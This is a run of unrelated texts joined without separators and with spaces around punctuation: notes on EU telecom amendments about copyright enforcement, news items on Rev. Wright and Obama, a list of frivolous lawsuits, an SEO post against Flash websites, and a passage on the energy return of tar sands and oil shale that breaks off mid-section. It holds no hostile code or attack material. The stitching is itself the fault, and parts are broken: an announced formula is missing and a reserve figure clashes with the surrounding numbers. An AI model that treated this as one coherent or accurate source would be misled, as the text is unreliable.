The concept of security is used by DRMS ( Digital Restriction Management System ) vendors and also in national laws implementing the directive 2001 / 29CE which forbid the circumvention of technical measures used to control copy of works ( as DRM do ) .
So when reading this amendment , the security of an electronic communication equipment must be unterstood also as the security by obscurity of DRM used to prevent , detect or intercept IP infrigments ( in compliance with amendments H1 and K1 ) .
Spekulaticve : " a public or private " network reads to me , as they also have the power to break into your " private " network .
( LAN , VPN Connections ... )
And if electroniv communication equipment is your computer , they may check it out too ???
Opinions please .
Amendment H2 , Harbour [ modifier ]
Known part of three - strikes approach , introduces the concept of cooperation between ISP and producers under the authority of national regulation authorities , written by the French cinema lobby , SACD .
Article 1 – point 20 xx amending Directive 2002/22 / EC
Article 33 – paragraph 2a ( new )
Without prejudice to national rules in conformity with community law promoting cultural and media policy objectives , such as cultural and linguistic diversity and media pluralism , national regulatory authorities and other relevant authorities shall also as far as appropriate promote cooperation between undertakings providing electronic communications networks and / or services and the sectors interested in the protection and promotion of lawful content in electronic communication networks and services .
These co-operation mechanisms may also include coordination of the public interest information to be made available as set out in Article 21 ( 4a ) and Article 20 ( 2 ) .
NB :
La Quadrature du Net has evidence that this amendment was written by SACD : http://www.laquadrature.net/en/privacy-film-industry-pirates-european-law.
Amendement H3 , Harbour [ modifier ]
Known part of three - strikes approach , permits intimidation by email and mandates that ISPs costs are paid for by the national regulator , ( as is the case for the French draft law on three - strikes approach ) .
Article 1 – point 12 xx amending Directive 2002/22 / EC
Article 21 – paragraph 4a ( new )
Members state shall ensure that national regulatory authorities oblige the undertakings referred in paragraph 4 to distribute public interest information to existing and new subscribers when appropriate .
Such information shall be produced by the relevant public authorities in a standardised format and may inter alia cover the following topics : ( a ) illegal uses of electronic communications services , particularly where it may prejudice respect for the rights and freedoms of others , including infringement of copyright and related rights ; ( b ) the most common illegal uses of electronic communications services , including copyright infrigement , and their consequences ; and ( c ) means of protection against risks to personal security , privacy and personal data in using electronic communications services .
Significant additional costs incurred by an undertaking in complying with these obligations shall be reinbursed by the national regulatory authority .
NB :
This amendment forces Internet Access Providers ( ISPs ) to send notice messages to users when unlawful uses have been detected .
The issue is that it does n't tell who is the sender ( private enterprises , national regulatory authorities , judicial authority ? ) .
The difference between point ( a ) and point ( b ) should be noted : the first one aims at individual uses ( informations on intercepted or detected allegedly infringements ) whereas the second one is general ( informations on most common cases of unlawful uses of Internet access ) .
Point ( c ) is about informations on traffic data processing means without permission for Internet access security reasons , authorized by Commission through amendment H1 , K1 , and K2 .
This is the exact description of informations that French government is eager to send to users in the so - called three - strikes approach in order that users install filtering and monitoring means .

The embattled former minister of Democratic presidential hopeful Barack Obama fired back at the news media during a Chicago funeral service .
The Rev. Jeremiah Wright 's remarks were reported Sunday in the Chicago Sun -Times .
Wright did n't mention church member Obama , who has denounced Wright 's inflammatory comments circulated in video excerpts of his past sermons .
But in his eulogy at Saturday 's funeral for the late R. Eugene Pincham , a retired judge , Wright did pillory some of his critics , including Fox News commentators Bill O'Reilly and Sean Hannity .
Wright said Pincham befriended " Jews , Muslims , rabbis , imams , fathers in the Catholic church and ( Louis ) Farrakhan in the Islamic faith . "
He said : " Fox News ca n't understand that .
O'Reilly will never get that .
Sean Hannity 's stupid fantasy will keep him forever stuck on stupid when it comes to comprehending how you can love a brother who does not believe what you believe . "
The remarks drew a standing ovation .
Officials said the megachurch 's 2,500 - seats were filled with mourners .
Wright also spoke of patriotism and the history of America 's treatment of blacks .
He said the country 's founding fathers " planted slavery and white supremacy in the DNA of this republic , " and said that Thomas Jefferson wrote , " God would punish America for the sin of slavery .
I guess that makes Thomas Jefferson unpatriotic . "
Saturday 's funeral at Trinity United Church of Christ was closed to reporters .
But the Sun -Times had a reporter inside the church .
The newspaper 's Web site Sunday carried a recording of Wright 's remarks as he eulogized Pincham , who died at age 82 earlier this month following a long illness .
While Obama in the past has denounced the most inflammatory of Wright 's comments , the candidate has said Wright should n't be judged solely on a handful of remarks .
Obama expressed admiration and support for the pastor who officiated at his wedding , baptized his two daughters and inspired the title of his best - selling book , " The Audacity of Hope . "

WATERTOWN , South Dakota ( Reuters ) - Democratic presidential front - runner Barack Obama said on Friday President George W. Bush ’s “ failed policies ” had strengthened U.S. enemies like Iran and Hamas .
Responding to Bush ’s comment on Thursday that those who want to talk to Iran were like Nazi appeasers before the Second World War , Obama accused Bush of “ exactly the kind of appalling attack that ’s divided the country and that alienates us from the world . ”
Obama also challenged Bush and Republican presidential rival John McCain to a debate on foreign policy issues , a day after Bush caused outrage among Democrats with his remarks on appeasement before the Israeli parliament .
McCain , who has clinched his party ’s presidential nomination , did not repeat the word “ appeasement ” on Thursday .
But he did criticize Obama ’s pledge to speak directly to U.S. foes , particularly Iranian President Mahmoud Ahmadinejad .
He said Obama needs to explain why he would talk to him .
“ If George Bush and John McCain want to have a debate about protecting the United States of America , that is a debate that I ’m happy to have any time , any place , and that is a debate that I will win because George Bush and John McCain have a lot to answer for , ” Obama said in a campaign speech in South Dakota .
“ They ’ve got to answer for the fact that Iran is the greatest strategic beneficiary of our invasion of Iraq .
It made Iran stronger , George Bush ’s policies , ” he said .
“ They ’re going to have to explain why Hamas now controls Gaza , Hamas that was strengthened because the United States insisted that we should have democratic elections in the Palestinian Authority . ”
“ That ’s the Bush - McCain record on protecting this country , ” he added .
“ Those are the failed policies that John McCain wants to double down on . ”
Proud to be an American ?
There ’s reason .
We have a beautiful country filled with natural and man-made wonders .
We ’re home to some of the world ’s most talented business innovators .
And we , the people , reserve the right to sue anyone we want for anything we want .
You ’re next , Victoria ’s Secret .
Because there ’s nothing like an unruly thong to provoke a latent lawsuit .
How the woman damaged her eye with her underwear is beyond me .
But does she really need Vic ’s to reimburse her for it ?
According to ABC News ,
The thong , a Victoria ’s Secret Sexy Little
Thing low - rise v-string , had a heart - shaped pendant attached to the fabric with a metal fastener , according to the lawsuit .
When Patterson was changing after work , the metal piece snapped , creating a “ slingshot effect , ” and either the pendant or the metal piece “ cut her eye … ”
Here are 15 more of the nation ’s dumbest corporate lawsuits .
Just in case you needed reminding :
15 . A Florida woman sued a guide - dog school because a blind man being guided by one of the dogs stepped on her foot .
14 . A man sued McDonald ’s for “ failing to warn customers about the dangers of eating and driving . ”
The impetus ?
A man who ’d spilled a milkshake on his lap at the drive - thru collided with the defendant ’s car .
13 .
An Idaho college student decided to moon his friends , and fell out the window as a result .
So he sued the college for not providing enough warning signs in upper - story windows .
12 . A dry cleaner lost Roy Pearson ’s pants , causing him great mental suffering .
He alluded to the dry cleaner ’s “ satisfaction guarantee ” as an excuse to sue the company for $ 67 million .
11 . A man from Montana sued Viacom for plagiarizing his name .
The man ’s legal name is Jack Ass , and Jack Ass sued because the TV show Jackass infringed on the copyright and trademark of his name .
And “ defamed his good character . ”
( The man , nee Bob Craft , changed his name to Jack Ass in 1997 in order to “ raise awareness about drunken driving . ” )
10 .
A convenience store worker in West Virginia injured her back while opening a jar of pickles .
The store awarded her $ 2,699,000 in punitive damages , $ 130,066 in compensation and another $ 170,000 for her emotional distress .
9 . A couple from Columbia , SC lost their son to a killer whale .
He was found dead and naked on the back of an orca whale at SeaWorld Orlando .
He had drowned after sneaking into the whale tank and going for a swim with the killer whale .
The couple sued SeaWorld Orlando , “ alleging the dangerous orca was portrayed as a huggable stuffed toy .
Attorney Patricia Sigman said SeaWorld is legally liable because it portrayed the killer whale as human loving . ”
8 . A pair of Chicago attorneys filed a class action suit against Penthouse magazine , because they failed to “ see tennis sensation Anna Kournikova without her racket and tennis outfit . ”
The damages ?
$ 8.99 each , or the price of the magazine .
7. Consumer Meredith Berkman filed a class-action suit against Robert ’s Foods , who make a snack called Pirate ’s Booty , for $ 50 million .
Four months prior , Robert ’s had recalled its product because food labels understated calories by 27 and fat by 6 grams .
Berkman ’s suit claimed “ emotional distress ” and “ weight gain … mental anguish , outrage and indignation …
The complaint claims to represent all consumers who ruined their diets and had to spend more time at the gym because they ate mislabeled Pirate ’s Booty . ”
6 . In 1995 , passengers on an LA - New York American Airlines flight experienced extreme turbulence for 20 seconds .
Passengers sued the airline for the “ psychological impact of the twenty eight seconds of terror . ”
Their reward ?
$ 2 million .
5. Nita Bird , a woman having outpatient surgery , had something go wrong during surgery .
Surgeons rushed her down the hallway into another room in order to save her life .
Her two daughters saw their mother being rushed down the hallway , appearing to be in extremely poor physical condition .
The two daughters sued the doctors and the hospital for causing them emotional distress .
They should n’t have had to see Mom like that , and it was the hospital ’s fault .
That case was lost –in the California Supreme Court .
4. Bennie Casson had a stripper slam him on the head and neck with her two 40 - pound breasts , contusing and bruising his neck .
He sued the strip club for $ 200,000 for the mental anguish , indignity , and emotional distress he experienced after the incident .
3. Employees at the Las Vegas Hilton and Mandalay Bay Hotel kept handing a drunk man money to gamble with .
He had a hard night , losing more than $ 1 million .
So he sued the two hotels for supposedly knowing he was “ drunk as a skunk ” and continuing to give him gambling money anyway .
2. A British dollmaker with dark tastes decided to turn Barbie into a “ Dungeon Doll ” in rubber bondage dress and a helmet .
Mattel sued the dollmaker for copyright infringement .
The judge wrote them off , claiming the Dungeon Doll poses no threat to regular Barbie sales .
1. Yup , here it is again .
The infamous 1992 McDonald ’s coffee case .
Stella Liebeck spilled McDonald ’s coffee on her lap in the drive - thru , scalding her genitals , buttocks , and inner thigh .
She received more than $ 2.7 million in damages .
( To her credit , she was n’t the first one to have trouble with Micky D ’s scalding coffee . )

I ’d like you to do me a favor .
Please disregard everything you may have read this morning on Search Engine Land , Matt Cutts ’ blog and even on the Official Google Blog .
Flash is still evil ; please do n’t use it to design your entire Web site .
No , really .
Do n’t .
I think it ’s great that Adobe is helping Google and Yahoo to read Flash files and even extract links out of them .
TechCrunch explains how Adobe has created a special Flash player for the engines to use which will translate the .
swf file into something they can read and understand .
The engines will be able to click around and interact with a page the same way a user would .
Even better , site owners will have to take no additional steps to get their content crawled .
Google did note , however , that the crawler will not execute any type of JavaScript , so if your page loads a Flash file via JavaScript , you ’re still out of luck .
It all sounds very cool and will be a great boon to the search engine optimization industry .
We ’ll no longer have to fight Google as we try and create workarounds to get previously invisible content to rank and in front of users .
However , the news that Google may soon be able to index this content changes nothing .
It ’s still up to you to convince your clients to avoid Flash .
As pretty as it may be in small doses , a Web site entirely in Flash still presents a poor user experience .
No one wants to sit through that .
I do n’t care how indexable it is .
There are still far better ways to present that content .
As excited as the SEO nerd in me was to hear Google ’s announcement this morning , it also makes me worry .
Before today , Flash was considered mostly unindexable by the search engines .
Sites were encouraged not to rely on it knowing that the search engines spiders would get tripped up and that their content would not be searchable .
And despite all those warnings , how many God awful Web sites are out there designed completely in Flash ?
About a gazillion .
And how much do you hate them ?
About a gazillion times over .
And now Google is giving designers the green light to use Flash ?
Oh my goodness , Batman , get ready for a total Flash onslaught .
Do not want !
Flash Web sites are still teh suck .
They ’re a lame attempt to make your boring site look interesting by distracting users with pretty pictures and moving frames .
You should be using your content and product / service offerings to do that .
HTML and Flash may be becoming more equal to the search engines , but most users will still favor an HTML Web site that they can navigate easily .
Today ’s announcement is something worth watching , but I do n’t think it changes anything yet .
I also wonder why Google had to wait on Adobe to “ invent ” some kind of special Flash player for them to use .
It seems to me that if it were that simple Google would have done it years ago , no ?
Or are the brains at Adobe really smarter than the ones at the Googleplex ?
I do n’t know .
My SEO advice : Stick with creating HTML - based Web sites that users will want to interact with .
Save the Flash stuff for the movie Web sites no one really cares about anyway .

Professor
Hall has been working in this area for over 30 years .
Below are net energy analysis from Hall 's group on the unconventional oil sources from tar sands and oil shaletwo resources that theoretically are enormous in energy scale , but practically are limited by flow rates , costs , and externalities .
Just how limited is the subject of todays two - part informative post is below the fold .
Remember , any specific numerical help via referenced literature , personal experience or knowledge to better inform Dr. Hall and his students would be appreciated .
This is third in a series of six guest posts by Professor Charles Hall of the SUNY College of Environmental Science and Forestry describing the energy statistic , " EROI " for various fuels .
As has been discussed often on this site , net energy analysis is a vitally important concept - just as we primarily care about our take home pay which is our salary minus the taxes , we should care about our ' take home ' energy , which is what is left after energy costs have been accounted for .
As important as it is , this measure is not easy to quantify , as : a ) data is almost always measured in $ as opposed to energy terms , b ) parsing non-energy inputs ( and outputs ) into energy terms is difficult , and c ) analysis boundaries ( including environmental impacts ) are very disparate .
As such , there is not ( has not yet been ) a consistent formula for EROI applied to all energy studies that has led to policymakers and analysts speaking the same language in useful ways .
The lead paper in this months Royal Academy of Sweden 's journal AMBIO will be about such an EROI framework , and we will link to it when it comes online .

APPENDIX D TAR SANDS / OIL SANDS
M.C. Herweyer , A. Gupta
Definition
Oil sands , also called tar sands , consist of bitumen mixed with sand .
Bitumen or “ very heavy ” oil is composed of carbon rich , hydrogen poor , long chain molecules and is in a semi - solid or solid form .
It has not been “ cooked properly ” by geological processes to yield the lighter fractions we call oil .
It is familiar to modern humans as the black constituent of asphalt used for roads and shingles .
Generally its API ( a gravity or density scale developed by American Petroleum Industry ) gravity is less than 10 API , and its viscosity is so high that it does not flow naturally ( higher than 10,000 cPo ) ( Briggs 1988 ) .
As a comparison , conventional crude oil has an API gravity of about 30 - 40 , and a viscosity of 5 cPo .
The product produced by mining and processing tar sands is usually called syncrude ( Syncrude is also the name of a company that produces the product ) .
Distribution and history of use
Bitumen is found more or less wherever petroleum is found , although by far the largest deposits are as tar sands .
About 81 % of the extractable oil sands of the world are found in Canada ( AEUB , 2003 ) .
Venezuela also has large resources but it is heavier , of much lower quality and very difficult to extract .
The ancient Mesopotamians used bitumen or asphalt as an adhesive in activities from sticking arrowheads on shafts to architecture , although its use was always limited .
The oil sand history started with the development of oil sand separation in the 1920s by Dr. Karl Clark .
In 1936 Max Ball developed a way to produce diesel oil from it .
The actual commercial production started in 1963 when the Sun oil company – later Suncor – started the construction of the first commercial oil sand production plant .
The first barrel of commercial production by open pit mining was produced in 1967 ( Syncrude 2006 ) .
The more complicated in situ techniques started their production of sand oil in 1985 .
After the rise of crude oil prices in 2003 , investments in oil sands production tripled over the years and it has become a booming business .
Technology
The oil sands can be extracted in two ways : open - pit mining for oil sands located on or just below the surface , and in situ recovery for oil sands located underground .
About 80 percent of the oil sands are located deeper then 70 - 80 m below surface and some large proportion can be extracted but only via in situ techniques ( Mawdsley et al. 2005 ) .
The remaining 20 % can be extracted by open - pit mining techniques .
After the excavation or drilling , bitumen is extracted from the remaining mixture of sand and water .
About two tons of tar sands are required to produce one barrel ( roughly 1/ 8 of a ton ) of oil .
The next phase is either to use hydrogen to upgrade the bitumen to 30o API syncrude , which has a quality comparable to conventional crude oil , or to blend it with higher quality diluents such as conventional oil .
Both these products can be refined at existing refineries .
An important issue is the degree to which natural gas is required either for process heat or for upgrading the quality and reducing the viscosity of the bitumen .
Surface mining
The only operational Canadian open - pit mining process which excavates the oil sands is the truck and shovel technique .
After excavating , the extracted material is treated ex situ ( above ground ) , first in a separation plant and then in an “ upgrader ” plant .
The first step in the ex situ treatment cycle is the sizing process , where the biggest pieces are broken into smaller ones by a crusher .
Then the bitumen is separated from the water , sands ( quartz ) , and clays by a water - based conditioning and flotation process ( Schramm et al. 2001 ) .
Underground mining
There are four main in situ techniques that can be used for extracting oil sands located deeper than 70 – 80 m below surface .
The most common techniques are Cold Heavy Oil Production on Site ( CHOPS ) and Steam Assistance Gravity Drainage ( SAGD ) .
The Cyclic Steam Stimulation ( CSS ) method was developed and used , but recently proved to be inefficient .
The fourth technique , the Toe - to - Heel Air Injection ( THAITM ) is in a late stage of development and is thought to be efficient and productive .
Finally , a pilot project under the name “ Orion ” run by Petrobank will probably start to produce in 2008 .
( Petrobank , 2004 ; NEB , 2006 )
The CHOPS process does not filter out the sands at the production wells , but instead pumps the sand fraction up along with the bitumen and water .
It is commonly used for extra - heavy oil production but not as much in the production of oil sand ( for later separation ) because the oil sand bitumen is too viscous to pump using CHOPS .
The SAGD technique uses two horizontal wells .
Steam is injected in the upper well to heat the oil sands and lower the viscosity of the bitumen , and the lower well is for pumping out the bitumen .
Light crude oils or natural gas are used as solvents to capture the condensates in the steam gas .
This process is called Vapor Recovery Extraction ( VAPEX ) and the Solvent Aided Process ( SAP ) ( Conti et al. 2006 , Mawdsley et al. 2005 ) .
The CSS technique uses either one horizontal or one vertical drill to inject steam into the oil sand - field to pump the fluidized bitumen .
The cycle starts by pumping in the steam in the steam injection phase and then heating up the viscous bitumen in the soak phase , which takes three to four weeks .
Finally , the fluidized bitumen can be pumped up in the production phase .
Once this cycle is completed the process starts all over again at a new site .
The THAI - TM technique is a combustion process which uses a vertical air injection well and a horizontal production well .
A fraction of the bitumen in place is burned with the inserted air so that the remaining bitumen will warm up and attain a lower viscosity ( Mawdsley et al. 2005 ) .
The fluidized bitumen then flows down to a collecting pool and is extracted by the production well .
Another method which can be used in combination with one of the above mentioned techniques is the Pressure Pulse Flow Enhanced Technique ( PPT ) .
This is not an extraction technique , but one that stimulates extraction .
PPT is based on the discovery that large amplitude and low frequency wave energy will enhance flow rates in porous matter ( Dusseault 2002 ) .
The next conversion step to obtain syncrude is called upgrading , which typically consists of two steps .
The primary upgrading is based largely on “ coking ” and “ catalytic ” ( hydro ) processes by a coker and / or an ebullated bed hydro process .
The primary process will crack the larger bitumen into lighter products , but the process will leave a significant amount of sulfur and nitrogen compounds in the lighter products and a secondary process is needed .
The secondary upgrading process is based on hydro processing by one or more hydro processing units ( Alberta Chamber of Resources 2004 ) .
After going through these processes the API gravity is about 30o API .
About 1.16 barrels of bitumen and 28 cubic meters of natural gas are necessary to produce 1 barrel of syncrude by this method .
Both mining and InSitu operations also use large volumes of water for their extraction process .
Between 2 and 4.5 volume units of water are used for the extraction of one volume unit bitumen ( National Energy Board 2006 ) .
There have been some proposals for the use of nuclear power to provide process heat .
Resource base
According to the Alberta Energy and Utilities Board ( AEUB 2003 ) the initial volume of crude bitumen in place is about 1.7 trillion barrels , which is the total for Canada .
About 11 % or 175 billion barrels are thought economically available for extraction ( National Energy Board 2006 ) , but according to Syncrude ( Syncrude 2006 ) , the recoverable fraction could rise up to 315 million barrels with advanced techniques .
Currently 36 different oil sand projects are either already operating or under development in Canada .
The smallest production is coming from the projects Great Divide and Halfway Creek , which are run by Connacher and ValueCreation , respectively .
Their production capacity is about 10 thousand barrels of bitumen per day ( kbb/d ) and they both apply InSitu recovery technique .
The Horizon mine has the largest production capacity with about 500 kbb/d and is run by the Canadian National Resources Limited ( CNRL ) .
Many of these operations use InSitu techniques despite the fact that open pit mines are easier to initiate .
There are three principal reasons to use InSitu :
1 : Only 20 % can be extracted by an open pit technique , because the rest of the resources are located deeper then 70 meters below surface ( too much over - burden ) .
2 : The economic costs of InSitu are marginally cheaper than the open - pit mining .
Because the most optimal mining locations are already in use , InSitu will be cheaper for new investments .
3 : After the InSitu excavation the product is mainly bitumen ( with some fractions of water and aerosols left in ) , while the excavation product from surface mining is mainly sand with about 10 % bitumen .
External sand / bitumen separation is necessary , and this is a difficult and expensive process .
The production volume of the oil sands is expected to grow steadily .
The production in 2005 was almost 1 million barrels of bitumen per day ( Herweyer , 2007 ) .
In 2020 the production is expected to be 4.9 million bb/d if there are no major problems such as environmental restraints on production .
Despite the fact that only 20 % of the total oil sand resources can be extracted by the mining technique , the ratio of mining to InSitu recovery is about 50/50 .
This is expected to stay approximately equal until 2020 ( Herweyer , 2007 ) .
Even at 5 million barrels per day or about 1.5 billion barrels per year ( representing about 25 percent of current US use ) the 175 billion barrels of reserves would last for at least 100 years .
The limiting factors , if any , are likely to be not the tar sands but the associated hydrogen , water requirements and environmental impacts .
It is likely to be a rate limited , rather than a resource limited , process for some time .
A factor that is rarely mentioned is that about half of the increased production is necessary to compensate for the decline of existing conventional wells which were recently the dominant source of oil in Canada .
EROI
Methodology
The issue of EROI is different from most other fuels because the energy source for the process is from the resource itself and it has no other alternative economic uses .
This is different from “ diverting ” energy either from society ( e.g. to mine coal or grow a biomass fuel ) or from a situation where the energy could be immediately used by society ( natural gas used at a petroleum well to run a pump vs being piped to society ) .
The oil sand EROI is calculated by the following formula , although only direct and indirect input energies tend to be used by most analysts :
Where : Eoutput = Eboe =
Energy content of one barrel of oil equivalent ( 6164 MJ )
Einput = Total energy input ( MJ/ boe )
Edirect = Direct energy demand ( only the energy flows ) ( MJ/boe )
Eindirect = Indirect energy demand ( e.g. energy to make capital equipment ) ( MJ/ boe )
ELabor = Labor energy demand ( Includes labor and maintenance ) ( MJ/boe )
Eenv. = Environmental energy demand ( Kyoto protocol , others ) ( MJ/boe )
In this case the energy output is relatively simple to calculate as it is equivalent to the energy content of one barrel of crude oil .
The energy input , however , is more complicated .
We determined the energy content of the different processes involved within the research boundary ( extraction , separation and upgrading ) separately by a “ bottom - up ” accounting framework approach .
The direct energy is efficiency corrected ( i.e. primary electricity is multiplied by three ) and calculated in MJ .
It is not calculated back to all primary energy used e.g. if diesel was used in the process , the energetic extraction , refinery , and transportation cost of that fuel is not calculated .
Rather only the energy content of diesel is used as a parameter .
Thus the EROI numbers we generate are conservative ( i.e. higher than if more comprehensive boundaries are used ) .
We determined the indirect , labor , and environmental components of the EROI , used in sensitivity analysis , by calculating the total dollar costs per barrel for each of these sectors ( see Figure 2 ) per boe and then multiplied by the energy value per USD2006 .
Indirect energy includes capital costs per boe ( corrected for the capital recovery factor ) .
Labor includes only the direct labor and maintenance per boe .
Environment costs include the CO2 emission trading cost per boe ( from the Kyoto protocol ) as an indicator for the GHG emission costs , and anassumed socio - environmental costs for the impacts to the direct surroundings .
Results
By our admittedly incomplete calculations the EROI depends mostly upon the direct energy used and which alone suggests an EROI of about 5.8:1 ( Figure 1 ) .
Including indirect energy decreases the EROI to about 5.2:1 , and adding in labor and environmental costs have little effect .
A comparison with the limited other data out there indicates that our analysis generates a somewhat higher EROI than others ( Table 1 ) .
Nevertheless it appears that tar sands mining yields a significantly positive EROI .

Economics
The average production cost of one barrel of syncrude from the oil sand resources in Canada was approximately 32 USD in the year 2006 .
The mining process costs about 16 USD2006 / barrel of oil equivalent ( boe ) .
The InSitu SAGD extraction costs about 14 USD2006 / boe , and the upgrading process to syncrude costs about 16.5 USD2006 / boe .
Figure 2 shows the break down of the total costs that were incorporated in the EROI calculations above ( Herweyer 2007 ) .
Mining costs appear to be decreasing according to some reports in early 2008 .
Syncrude has approximately the same quality as conventional crude oil , and is therefore competitive .
So long as the conventional crude oil price stays above 31.5 USD2006 / boe ( excluding profits ) it is profitable to extract oil sands .
The conventional crude oil prices in 2006 were 56 and in 2007 as much as $ 80 USD / boe ( BP 2006 ) .
However at the same time the price of diesel , natural gas , steel and so forth used in generating the syncrude were increasing .
Nevertheless it appears that tar sands will be a competitive source of oil for the indefinite future .
Figure 2 : A break down of the production costs of a case study about synthetic crude oils .
Note that the mining , InSitu SAGD , and the Upgrader processes are located in Canada and based on Oil Sands , and the InSitu CHOPS is located in Venezuela and is based on Extra - Heavy Oil .
The total cost is roughly 32 dollars per barrel of syncrude .

Capital costs and natural gas liquids are the most monetary cost - intensive inputs of the production of oil sands ( see Figure 1 ) .
Both these products are also considered very energy - intensive .
Therefore the production cost of oil sands is closely related to the costs of energy .
The Alberta oil sands tax regime is such that it makes it very appealing for investors to put their money into oil sands business .
The attractiveness in the fiscal regime is that until all original capital ( plus a return ) is recovered , only a production royalty of 1 % of revenue is required .
After the original capital is earned back by oil sand recovery , a royalty of 25 % of net operating income is required .
The tax regime is such that essentially no income tax has to be paid until all capital costs are recovered ( TD Securities 2004 ) .

Socio / Environmental aspects
Canada has an open market based economy with favorable conditions for oil sands investments , so that production volume can increase rapidly .
In 2002 Canada agreed to reduce their greenhouse gas emissions ( GHG ) emissions by 6 % compared to their 1990 emissions in the Annex I period of the Kyoto protocol ( 2008 – 2012 ) .
By 2004 , however , the GHG emissions had already risen by 28 % above 1990 levels ( Commission Environmental and Sustainable . 2006 ) .
In 2006 , Canada declared it could not meet their Kyoto targets and even considered removing policies designed to meet the targets .
The oil sand industry is one of the major GHG emitters in Canada and the entire process approximately doubles to triples the amount of CO2 released per barrel of petroleum used compared to conventional extraction .
The mining process emits about 35 kg CO2 equivalent / barrel , and the upgrading process 45 kg CO2 equivalent / barrel , and the SAGD process 55 kg CO2 equivalent / barrel , ( Bramley et al. 2005 ) .
In the business as usual scenario for the GHG emissions per barrel of bitumen , the total oil sand GHG emissions until 2020 are as follows : ( Herweyer 2007 ) .

According to the National Energy Board ( 2006 ) , natural gas use will increase from 0.7 billion cubic feet per day in 2005 to 2.1 billion cubic feet per day in 2015 .
Although Canada has natural gas resources , this enormous rise in natural gas demand will be difficult to meet .
The current capacity of the natural gas infrastructure and production will not be sufficient to keep up with these rises and might present a problem .
In addition , the natural gas prices are coupled to the crude oil prices , and so they have risen as well .
There is also the large issue of where the natural gas will come from – Exxon is now saying they may not be able to build the necessary MacKenzie pipeline unless they receive significant monetary help from the government .
Both mining and in situ operations use large volumes of water for their extraction process , between 2 and 4.5 volume units of water is used for the extraction of one volume unit bitumen ( National Energy Board 2006 ) .
Currently the mining operations are licensed to divert 370 million cubic meters ( equivalent to 2.3 million barrels ) of fresh water per year from the Athabasca river .
The planned mining projects will push the cumulative diversion with 529 million cubic meter ( 3.3 million barrels ) per year ( Alberta Environment 2006 ) .
Almost all process water ends up in tailing ponds .
Besides the fresh water diversions , the mining operations have a direct effect on the ground water level .
Mining pits are excavated up till 70 - 80 m below ground level , which is often below natural ground water levels as well .
To prevent water flowing into the mining pit , the groundwater has to be controlled by pumping it up .
As a result , the groundwater level of the surroundings is lowered , and the flows are disturbed .
In Canada the most common in situ technique is SAGD , which uses steam to extract the bitumen .
This process requires a large amount of water .
Although most in situ projects try to reduce fresh water use by mixing with saline groundwater , and recycling about 90 to 95 % of the used water , the amount of diverted fresh water is relatively high .
In 2004 the in situ projects used 5 million cubic meters ( 31.5 million barrels ) of fresh water , and this will grow to 13 million cubic meters ( 81 million barrels ) in 2015 ( National Energy Board 2006 ) .
The gaps that the mining pits leave behind are of such an extent that you can see them clearly in satellite pictures from space .
The surface sizes disrupted are enormous .
The decline in unemployment , the increase in prosperity , and the independency in liquid energy supply are positive ( economical ) social effects , although they are also associated with the familiar issues of boom towns associated with alcohol and sometimes family disruptions .
CONCLUSION
In conclusion , tar sands are an economically and energetically viable , although hardly ideal , approach to maintaining liquid fuel supplies .
The most severe problem is probably their local and global environmental impact , and they are already impacting Canadian CO2 releases significantly .
But the tar sands are unlikely to make a large impact on overall supply of liquid fuels because their supply is likely to be rate , rather than total resource limited .
If the maximum rate were to grow to about 2 billion barrels a year this would approximately meet Canada ’s demand and could leave relatively little for export if Canada ’s production of conventional oil continues to decline .
Achieving even this rate of production from tar sands is uncertain because of growing concerns about environmental impacts downstream and insufficient hydrogen and water .

Definition
Oil Shales are sedimentary rocks containing a high proportion of organic matter , called kerogen , which can be converted to synthetic oil or gas by industrial processing ( WEC 2007 ) .
According to the Encyclopedia of Energy ( Cleveland 2004 ) , oil shale is defined as fine grained sedimentary rocks containing organic matter ( kerogen ) that yield abundant amounts of oil and gas upon destructive distillation .
Although various definitions of oil shale exist , one usual factor is that the kerogen can conceivably be converted into fuel economically , which implies a yield greater than some threshold value , usually in the range of 100 - 125 l/ Mg ( 1 bbl = 159 L;1 Mg = 1 metric ton rock ) ( Burnham 2003 ) .
Oil shale recovery is a more difficult process in general than is tar sand recovery because the kerogen bonds more closely to the surrounding substrate .
History
For the U.S. , the deposits of oil shale were first studied in detail by the USGS in the early 1900 ’s , after which the government established the Naval Petroleum and Oil Shale Reserves in 1912 that for much of the 20th century served as a contingency source of fuel for the nation ’s military .
Thus oil shale was originally envisioned as a way to provide a reserve supply of oil to fuel U.S. naval vessels ( WEC 2007 ) .
Its development had always been on a small scale , but the project that was to represent the greatest development of the shale deposits began immediately after World War II in 1946 when the U.S. Bureau of Mines established the Anvils Point oil shale demonstration project in Colorado ( Ibid ) .
However , the project ended after it was deemed uneconomical since processing plants had been small and the cost of production high ( Ibid ) .
The most recent attempt at recovering oil from oil shales occurred in response to the Arab Oil Embargo in 1974 .
Congress responded with a Proposal for Northwest Colorado to be declared a ‘‘ National Sacrifice Area , ” including an Energy Mobilization Board with power to override federal , state and local environmental and land use laws ( Committee on Resources 2005 ) .
This board never materialized .
However , President Jimmy Carter did get Congress to establish the Synfuels Corp. with $ 15 Billion in price guarantees and incentives ( Ibid ) .
The goal for synthetic fuels was an industry that would convert coal , tar sands , and oil shale to liquid fuels at two million barrels per day by 1992 , the majority of which would come from Western oil shale ( Ibid ) .
Costs were at an average of $ 2 billion ( 1980 USD ) for each 50,000 BPD ( barrels per day ) plant ( Ibid ) .
In the end , the oil shale industry collapsed ; specifically , due to the huge volumes of material that needed to be removed and processed , the drop in world petroleum prices with which it competed , and the lack of a consistent national vision for the development of the resource that could focus private capital investment ( Ibid ; Hirsch , Bezdek , and Wendling 2005 ; US DOE ONPOSR 2004 ) .
Congress then shut down virtually all oil shale research programs , despite recommendations from many sources that research and development activities continue .
In 1991 , the Unocal operation in Colorado was the last major oil shale project to suspend operations ( Cleveland 2004 ) .
For many , the argument about energy was “ let the market decide . ”
Similarly , production from oil shale deposits in South - Eastern Australia began in the 1860 ’s ; coming to an end in the early 1950 ’s when government funding ceased ( WEC 2007 ) .
However , due to a modern exploration program at the Stuart Deposit , it was announced in May 2001 that the first shipment of over 40,000 barrels ( 5,800 tonnes ) of medium shale oil had been made to the south - east Asian fuel oil market ( Ibid ) .
That project is currently suspended ( Hirsch , Bezdek , and Wendling 2005 ) , and major long - standing shale oil production operations in Estonia , Scotland , Sweden , Canada and China are either gone or dwindling due to high costs relative to petroleum crude oil ( Burnham 2003 ; Cleveland 2004 ) .
Technology
Kerogen is extracted from oil shale in a process called ” retorting ” which requires heating of the rock to about 900 degrees Fahrenheit .
Two generic methods of retorting have been developed which are given here verbatim from the Committee on Resources ( 2005 ) :
In situ ( ICP ) :
